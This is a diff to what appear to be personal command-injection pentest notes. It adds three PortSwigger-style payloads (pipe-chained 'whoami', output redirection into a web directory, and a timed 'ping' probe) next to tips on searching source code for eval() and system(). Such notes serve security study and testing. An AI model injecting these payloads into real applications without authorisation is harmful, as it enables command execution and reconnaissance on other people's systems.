@@ -34,6 +34,13 @@
 ### Source Code Review :
 search in the source code keywords like `eval()` , `system()` ...etc 
 
+### Portswiger payloads :
+```
+|whoami
+||whoami>/var/www/images/test.txt||
+||ping+-c10+127.0.0.1||
+```
+
 ### Payloads :
 > Visit [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
 
